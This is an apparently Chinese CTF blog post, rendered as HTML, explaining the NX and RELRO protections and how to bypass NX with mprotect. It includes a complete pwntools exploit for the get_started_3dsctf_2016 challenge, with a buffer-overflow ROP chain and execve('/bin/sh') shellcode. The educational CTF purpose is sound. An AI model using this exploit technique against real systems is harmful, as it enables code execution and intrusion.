@@ -1,0 +1,108 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NX和RELRO保护绕过 | 南行</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+ --light-background: url('/img/bk.jpg');
+ --theme-encrypt-confirm: 'confirm'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>NX和RELRO保护绕过</h1></div><hr><div id="post-content"><h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><code>NX</code>保护机制的全写为 NO-Execute（不可执行），<code>NX</code>的原理是将数据所在内存页标识为不可执行，当程序被劫持到数据页（不可执行内存）时，程序会尝试在数据页面上执行指令，因为数据页被标记为不可执行，此时CPU就会抛出异常，而不是去执行数据。</p>
+<blockquote>
+<p><code>NX</code>保护的出现导致向数据段写入shellcode并执行的方法也不可行了。</p>
+</blockquote>
+<p>一般ret2shellcode的前提是没有NX保护，但是即便存在NX保护在一定条件下也有办法shellcode。</p>
+<p>这里介绍一个可以修改内存权限的函数。</p>
+<blockquote>
+<p>mprotect函数，可以改写内存权限</p>
+</blockquote>
+<ul>
+<li>第一个参数：开始地址（为了页对齐，该地址必须是一个内存页的起始地址，即页大小整数倍，1页&#x3D;4k&#x3D;0x1000）</li>
+<li>第二个参数：指定长度（长度也应该是页的整倍数，即0x1000的整数倍）</li>
+<li>第三个参数：指定属性（r&#x3D;4（读）、w&#x3D;2（写）、x&#x3D;1（执行））</li>
+</ul>
+<p>如果程序中存在这个函数就可以调用这个函数修改内存权限实现ret2shellcode。</p>
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>一般碰到有<code>NX</code>保护的程序常规情况下我们无法进行shellcode。</p>
+<p>所以我们需要通过其它利用方法绕过<code>NX</code>保护。</p>
+<ol>
+<li><p>首先找程序有没有后门函数，尝试进行ret2text。</p>
+</li>
+<li><p>如果没有后门函数就分析程序是否可以泄露<code>libc</code>基址尝试进行ret2libc</p>
+</li>
+<li><p>如果无法泄露基址，就查看是否存在合适的gadget进行ret2syscall。</p>
+</li>
+</ol>
+<p>如果以上都不行，我们可以通过搜索函数表是否存在<code>mprotect</code>函数，通过<code>mprotect</code>修改内存权限进行shellcode从而绕过<code>NX</code>保护。</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><blockquote>
+<p>get_started_3dsctf_2016</p>
+</blockquote>
+<ol>
+<li><p>查保护</p>
+</li>
+<li><p>分析</p>
+</li>
+<li><p><strong>exp</strong></p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>pwnfile=<span class="hljs-string">&quot;./get_started_3dsctf_2016&quot;</span><br>io=process(pwnfile)<br>elf=ELF(pwnfile)<br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>)<br><br>mprotect_addr=elf.symbols[<span class="hljs-string">&quot;mprotect&quot;</span>]<br>read=elf.symbols[<span class="hljs-string">&quot;read&quot;</span>]<br>mem_addr=<span class="hljs-number">0x080Ea000</span><br>mem_size=<span class="hljs-number">0x1000</span><br>mem_proc=<span class="hljs-number">0x7</span><br><br><span class="hljs-comment">#pop ebp; pop esi; pop edi; ret</span><br>pop_addr=<span class="hljs-number">0x0809e4c5</span><br><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x38</span>+p32(mprotect_addr)<br>payload+=p32(pop_addr)<br>payload+=p32(mem_addr)+p32(mem_size)+p32(mem_proc)<br><br>payload+=p32(read)<br>payload+=p32(pop_addr)<br>payload+=p32(<span class="hljs-number">0</span>)+p32(mem_addr)+p32(<span class="hljs-number">0x100</span>)<br>payload+=p32(mem_addr)<br><br>io.sendline(payload)<br><br><span class="hljs-comment">#pwntools生成shellcode</span><br>pay=asm(shellcraft.sh())<br><span class="hljs-comment">#也可以手写编码</span><br><span class="hljs-comment">#pay=&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;</span><br>io.sendline(pay)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>partial PELRO：一些段（包括.dynamic,.got等）在初始化后会被标记为只读。在unbuntu16.04（GCC-5.4.0）上，默认开启Partial RELRO。</li>
+<li>Full RELRO ：除了Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，.got.plt段会被完全初始化为目标函数的最终地址，并被mprotect标记为只读，但其实.got.plt会被直接合并到.got，也就看不到这段了。另外link_map和_dl_runtime_reolve的地址也不会被装入。开启Full RELRO会对程序启动时的性能造成一定的影响，但也只有这样才能防止攻击者篡改GOT。</li>
+</ul>
+<h3 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h3><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><blockquote>
+<p>参考：</p>
+</blockquote>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/11/01/pwn/bypass/pie/">← Next ASLR和PIE保护绕过</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/11/01/pwn/bypass/canary/">Canary保护绕过 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">南行</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/nanhang-950"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:2122295973@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NX"><span class="toc-number">1.</span> <span class="toc-text">NX</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass"><span class="toc-number">1.2.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RELRO"><span class="toc-number">2.</span> <span class="toc-text">RELRO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-1"><span class="toc-number">2.2.</span> <span class="toc-text">bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%A8%80"><span class="toc-number">3.</span> <span class="toc-text">后言</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
